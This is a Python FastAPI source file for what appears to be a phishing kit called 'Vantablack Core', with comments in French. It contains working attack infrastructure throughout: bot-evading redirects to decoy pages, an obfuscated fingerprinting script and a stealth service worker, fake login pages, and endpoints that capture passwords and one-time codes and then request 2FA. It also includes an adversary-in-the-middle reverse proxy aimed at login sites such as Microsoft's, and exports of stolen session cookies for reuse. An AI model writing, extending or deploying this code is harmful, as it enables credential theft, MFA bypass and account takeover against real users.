from fastapi import APIRouter, HTTPException, Response, Request, Depends, status, Form, WebSocket
from fastapi.responses import RedirectResponse, HTMLResponse, PlainTextResponse
from typing import Dict, List, Optional
from core.common.metrics import MetricsManager
from core.common.config import sanitized
from core.cache.redis_manager import redis_cache
from core.security.rate_limiter import rate_limiter
from core.redirect.smart_redirector import smart_redirector
from core.social.manager import social_manager
from core.proxy.aitm import aitm_proxy
from core.session.session_manager import session_manager
from core.web.polymorph import PolymorphicEngine
from pathlib import Path
from pydantic import BaseModel

router = APIRouter(prefix="/v5", tags=["Vantablack Core"])

# Initialize Polymorphic Engine
ASSETS_DIR = Path("core/assets/js")
poly_engine = PolymorphicEngine(ASSETS_DIR / "fingerprint_collector.js")

# --- Core Management ---

@router.get("/config")
@redis_cache.cached("app_config", expire=60)
async def get_config():
    """Récupère la configuration sécurisée (cachée)."""
    return {"config": sanitized()}

@router.get("/metrics")
async def get_metrics():
    """Récupère les métriques système au format Prometheus."""
    metrics, content_type = MetricsManager().get_latest_metrics()
    return Response(content=metrics, media_type=content_type)

# --- Smart Redirection & AiTM ---

@router.get("/r/{campaign_id}")
async def smart_redirect(campaign_id: str, request: Request):
    """
    Smart Redirection Endpoint (Tier 2 Logic)
    Analyse le trafic entrant, filtre les bots, et redirige vers la landing page ou le decoy.
    """
    try:
        result = await smart_redirector.process_request(request, campaign_id)
        
        if isinstance(result, (RedirectResponse, HTMLResponse)):
            return result
        
        # Si c'est un dict, c'est que l'accès est autorisé
        if isinstance(result, dict) and "redirect_to" in result:
             return RedirectResponse(url=result["redirect_to"], status_code=status.HTTP_302_FOUND)
            
        return result
    except Exception as e:
        # En cas d'erreur interne, fail-safe vers decoy pour ne pas exposer d'erreur
        print(f"[SmartRedirect Error] {e}")
        return RedirectResponse(url="https://www.google.com", status_code=status.HTTP_302_FOUND)

@router.post("/verify_fingerprint")
async def verify_fingerprint(request: Request):
    """
    Valide le fingerprint envoyé par le client JS.
    """
    try:
        data = await request.json()
        cid = data.get("campaign_id")
        sid = data.get("session_id")
        fp_data = data.get("fingerprint")
        
        if not cid or not sid or not fp_data:
             return {"redirect_to": "https://google.com"}
             
        result = await smart_redirector.verify_fingerprint(sid, fp_data, cid)
        return result
    except Exception as e:
        print(f"[API Error] Fingerprint verification failed: {e}")
        return {"redirect_to": "https://google.com"}

@router.get("/js/fp.js")
async def polymorphic_js():
    """Serves the Polymorphic Fingerprint Collector (Stealth)."""
    try:
        content = poly_engine.obfuscate()
        return Response(content=content, media_type="application/javascript")
    except Exception as e:
        print(f"[PolyEngine Error] {e}")
        return Response(content="// JS Error", media_type="application/javascript")

@router.get("/sw.js")
async def service_worker():
    """Serves the Stealth Service Worker (Power/Stealth)."""
    try:
        with open("core/assets/js/sw_stealth.js", "r") as f:
            content = f.read()
        return Response(content=content, media_type="application/javascript", headers={"Service-Worker-Allowed": "/"})
    except FileNotFoundError:
        return Response(content="// SW Not Found", media_type="application/javascript")

@router.get("/maintenance")
async def maintenance_page():
    """Serves the Decoy/Maintenance page (Stealth)."""
    return smart_redirector._serve_maintenance_page()

@router.get("/health")
@redis_cache.cached("health_check", expire=60)
async def health_check():
    """Vérification de santé (cachée)."""
    return {"status": "operational", "version": "5.0.0-Clean"}

# --- Social Engineering Campaigns ---

@router.post("/campaigns/create")
async def create_campaign(
    name: str = Form(...), 
    template_id: str = Form(...), 
    target_email: Optional[str] = Form(None),
    campaign_type: str = Form("aitm"),
    custom_slug: Optional[str] = Form(None)
):
    """Crée une nouvelle campagne de phishing."""
    try:
        campaign = social_manager.create_campaign(name, template_id, target_email, campaign_type, custom_slug=custom_slug)
        return {"status": "success", "campaign": campaign}
    except ValueError as e:
        raise HTTPException(status_code=400, detail=str(e))

@router.get("/campaigns/templates")
async def list_templates():
    """Liste les templates disponibles."""
    return {"templates": social_manager.list_templates()}

class CampaignModePayload(BaseModel):
    mode: str

@router.post("/campaigns/{campaign_id}/mode")
async def set_campaign_mode(campaign_id: str, payload: CampaignModePayload):
    """
    Définit le mode d'une campagne: 'template' ou 'aitm'.
    """
    try:
        updated = social_manager.update_campaign_mode(campaign_id, payload.mode)
        if not updated:
            raise HTTPException(status_code=404, detail="Campaign not found")
        return {"status": "success", "campaign": updated}
    except ValueError as e:
        raise HTTPException(status_code=400, detail=str(e))

@router.get("/phish/{campaign_id}/login")
async def serve_phishing_page(campaign_id: str, request: Request, sid: Optional[str] = None):
    """Sert la page de phishing (Template Mode)."""
    # Vérification basique de la session si fournie
    if sid:
        session = session_manager.get_session(sid)
        if not session:
             # Session invalide -> Redirection vers decoy ou nouvelle session
             return RedirectResponse(url="/v5/r/" + campaign_id)
    
    content = social_manager.get_template_content(campaign_id)
    
    # Injection universelle des IDs (Jinja2-style simple)
    if sid:
        content = content.replace("{{ session_id }}", sid)
    else:
        # Si pas de session, on peut soit créer une, soit laisser vide
        # Mieux vaut créer une session ici si possible, ou laisser le JS le faire via un appel initial
        # Pour l'instant on laisse vide, le JS devra gérer ou le client sera redirigé
        content = content.replace("{{ session_id }}", "")

    content = content.replace("{{ campaign_id }}", campaign_id)

    # Injection du session_id dans le formulaire pour le tracking (Legacy Templates)
    if sid:
        content = content.replace('<form action="/auth/login" method="POST">', 
                                  f'<form action="/v5/auth/login?sid={sid}" method="POST">')
    else:
        content = content.replace('<form action="/auth/login" method="POST">', 
                                  f'<form action="/v5/auth/login?cid={campaign_id}" method="POST">')
        
    return HTMLResponse(content=content)

@router.get("/session/{session_id}/export")
async def export_session(session_id: str, format: str = "json"):
    """
    Exporte les données de session (Cookies, Credentials) pour utilisation externe.
    Formats supportés: json, puppeteer, netscape.
    """
    try:
        # Vérification existence session
        session = session_manager.get_session(session_id)
        if not session:
            raise HTTPException(status_code=404, detail="Session not found")
            
        data = session_manager.export_session(session_id, format)
        
        if format == "netscape":
            if not isinstance(data, str):
                data = str(data)
            return PlainTextResponse(content=data, media_type="text/plain")
        
        return {
            "session_id": session_id, 
            "format": format, 
            "exported_at": session.get("last_activity", None),
            "data": data,
            "credentials": session.get("captured_data", {})
        }
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Export failed: {str(e)}")

@router.websocket("/proxy/ws")
async def proxy_websocket_endpoint(websocket: WebSocket, url: str):
    """
    WebSocket Proxy Endpoint for MFA/Real-time traffic.
    """
    await websocket.accept()
    session_id = websocket.cookies.get("session_id") or websocket.query_params.get("sid")
    
    # Extract cookies from websocket handshake
    cookies = dict(websocket.cookies)
    headers = dict(websocket.headers)

    try:
        await aitm_proxy.proxy_websocket(
            target_url=url,
            client_ws=websocket,
            session_id=session_id,
            headers=headers,
            cookies=cookies
        )
    except Exception as e:
        print(f"[WS Endpoint Error] {e}")
        try:
            await websocket.close()
        except RuntimeError:
            pass

@router.api_route("/proxy", methods=["GET", "POST", "PUT", "DELETE", "OPTIONS", "HEAD", "PATCH"])
async def proxy_handler(request: Request, url: str):
    """
    Endpoint proxy pour le trafic AiTM.
    Réécrit les requêtes vers l'URL cible et capture les données.
    """
    # Récupération du session_id (Cookie > Query Param)
    session_id = request.cookies.get("session_id") or request.query_params.get("sid")
    
    try:
        return await aitm_proxy.proxy_request(
            target_url=url, 
            request=request, 
            session_id=session_id, 
            body=await request.body(), 
            proxy_base_path="/v5/proxy"
        )
    except Exception as e:
        print(f"[Proxy Error] {e}")
        return Response(status_code=502, content="Upstream Error")

@router.post("/auth/login")
async def capture_credentials(request: Request, sid: Optional[str] = None, cid: Optional[str] = None):
    """
    Endpoint de capture des identifiants (Form POST ou JSON).
    Redirige ensuite vers le vrai site (ou une page d'erreur).
    """
    content_type = request.headers.get("content-type", "")
    captured_data = {}

    if "application/json" in content_type:
        try:
            captured_data = await request.json()
        except Exception:
            pass
    else:
        form_data = await request.form()
        captured_data = dict(form_data)
    
    # Gestion des paramètres de requête (priorité sur le body si présents)
    session_id = sid or request.query_params.get("sid") or captured_data.get("sid")
    campaign_id = cid or request.query_params.get("cid") or captured_data.get("cid")
    
    if not session_id and campaign_id:
        # Création d'une session à la volée si pas de SID
        session_id = session_manager.create_session(campaign_id, request.client.host, request.headers.get("user-agent", ""))
    
    if session_id:
        # Capture des données
        for key, value in captured_data.items():
            session_manager.capture_credential(session_id, key, value)
            
        print(f"[CAPTURE] Credentials captured for session {session_id}")
        
        # Récupération de l'URL cible pour redirection finale
        session = session_manager.get_session(session_id)
        campaign_id = session.get("campaign_id") if session else campaign_id
        
        target_url = "https://google.com" # Fallback
        if campaign_id:
            campaign = social_manager.get_campaign(campaign_id)
            if campaign:
                target_url = campaign.get("target_url", target_url)
        
        # Si la requête attend du JSON (fetch), renvoyer du JSON
        if "application/json" in content_type:
             # Logique Multi-Step Phishing (Phantasm Engine)
             # Si on a un mot de passe mais pas d'OTP, on demande le 2FA
             has_password = any(k in captured_data for k in ["password", "pass", "pwd"])
             has_otp = any(k in captured_data for k in ["otp", "code", "token"])
             
             if has_password and not has_otp:
                 return {"status": "2fa_required"}
                 
             return {"status": "success", "redirect": target_url}

        # Redirection vers le vrai site pour éviter les soupçons
        return RedirectResponse(url=target_url, status_code=status.HTTP_302_FOUND)
        
    # Fallback si pas de session
    if "application/json" in content_type:
         return {"status": "error", "redirect": "https://google.com"}
         
    return RedirectResponse(url="https://google.com", status_code=status.HTTP_302_FOUND)

@router.get("/sessions/{session_id}/export")
async def export_session_data(session_id: str, format: str = "json"):
    """
    Exporte les données de session (cookies, credentials) pour réutilisation.
    Formats supportés: 'json', 'netscape', 'puppeteer'.
    """
    session = session_manager.get_session(session_id)
    if not session:
        raise HTTPException(status_code=404, detail="Session not found")
        
    cookies = session_manager.export_session(session_id, format=format)
    
    if format == "netscape":
        return Response(content=cookies, media_type="text/plain")
        
    return {
        "session_id": session_id,
        "campaign_id": session.get("campaign_id"),
        "captured_credentials": session.get("captured_data", {}),
        "cookies": cookies
    }

# --- AiTM Proxy (Advanced) ---

@router.api_route("/p/{session_id}/{path:path}", methods=["GET", "POST", "PUT", "DELETE", "OPTIONS", "HEAD"])
async def aitm_proxy_handler(session_id: str, path: str, request: Request):
    """
    Endpoint AiTM Proxy v5.
    Intercepte le trafic et capture les sessions en temps réel.
    """
    # 1. Validation de la Session
    session = session_manager.get_session(session_id)
    if not session:
        # Session expirée ou invalide -> Redirection vers decoy
        return RedirectResponse("https://google.com")
    
    # 2. Récupération de la cible
    campaign_id = session.get("campaign_id")
    campaign = social_manager.get_campaign(campaign_id)
    if not campaign:
        return RedirectResponse("https://google.com")
        
    target_base_url = campaign.get("target_url")
    if not target_base_url:
        return Response("Configuration Error: No target URL", status_code=500)

    # 3. Construction de l'URL cible
    # target_base_url ex: https://login.microsoftonline.com
    # path ex: common/oauth2/authorize
    # On gère le slash de fin/début
    target_url = f"{target_base_url.rstrip('/')}/{path.lstrip('/')}"
    
    # 4. Lecture du body
    body = await request.body()
    
    # 5. Proxy avec Réécriture
    # proxy_base_path doit être le chemin vers ce handler pour que les liens réécrits reviennent ici
    proxy_base_path = f"/v5/p/{session_id}"
    
    return await aitm_proxy.proxy_request(
        target_url, 
        request, 
        session_id, 
        body, 
        proxy_base_path=proxy_base_path
    )

@router.websocket("/p/{session_id}/ws")
async def websocket_proxy(websocket: WebSocket, session_id: str, url: str = None):
    """
    WebSocket Proxy Endpoint for AiTM.
    Handles real-time traffic (MFA, Chat, Notifications).
    """
    await websocket.accept()
    
    try:
        # 1. Session Validation
        session = session_manager.get_session(session_id)
        if not session:
            print(f"[WS Proxy] Invalid session: {session_id}")
            await websocket.close(code=1008) # Policy Violation
            return

        # 2. Target URL Resolution
        if not url:
            # If URL is not provided, we might be trying to connect to the base target URL
            # But usually our rewriter puts ?url=...
            print(f"[WS Proxy] Missing target URL for session {session_id}")
            await websocket.close(code=1002) # Protocol Error
            return
            
        # 3. Proxy Execution
        # We pass headers and cookies to maintain session context
        headers = dict(websocket.headers)
        cookies = websocket.cookies
        
        await aitm_proxy.proxy_websocket(
            url, 
            websocket, 
            session_id, 
            headers, 
            cookies
        )
        
    except Exception as e:
        print(f"[WS Proxy Critical Error] {e}")
        try:
            await websocket.close(code=1011) # Internal Error
        except RuntimeError:
            pass # Already closed
